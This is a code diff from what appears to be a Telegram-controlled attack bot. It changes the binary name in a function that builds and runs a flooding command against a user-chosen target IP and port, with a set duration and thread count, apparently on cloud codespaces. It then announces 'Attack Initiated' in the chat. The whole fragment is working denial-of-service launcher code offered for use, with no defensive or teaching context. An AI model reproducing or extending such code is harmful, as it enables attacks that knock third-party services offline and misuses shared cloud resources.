@@ -393,9 +393,9 @@ async def run_attack_command_on_codespace(target_ip, target_port, duration, chat
     try:
         # Construct command based on selected binary
         if selected_binary == "Smokie":
-            command = f"./monster {target_ip} {target_port} {duration} {thread_count} "
+            command = f"./Smokie {target_ip} {target_port} {duration} {thread_count} "
         else:  # Smokie1
-            command = f"./monster {target_ip} {target_port} {duration}"
+            command = f"./Smokie {target_ip} {target_port} {duration}"
 
         # Send initial attack message
         bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗜𝗻𝗶𝘁𝗶𝗮𝘁𝗲𝗱!\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} seconds")
